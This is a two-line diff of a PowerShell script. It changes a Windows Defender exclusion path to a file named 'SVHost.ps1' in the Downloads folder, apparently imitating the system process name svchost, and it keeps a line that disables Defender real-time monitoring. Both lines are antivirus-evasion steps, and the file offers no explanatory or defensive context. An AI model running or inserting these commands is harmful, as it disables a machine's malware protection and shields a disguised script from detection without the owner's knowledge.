@@ -1,2 +1,2 @@
-Set-MpPreference -ExclusionPath ($HOME +'/Downloads/test.ps1')
+Set-MpPreference -ExclusionPath ($HOME +'/Downloads/SVHost.ps1')
 Set-MpPreference -DisableRealtimeMonitoring $true
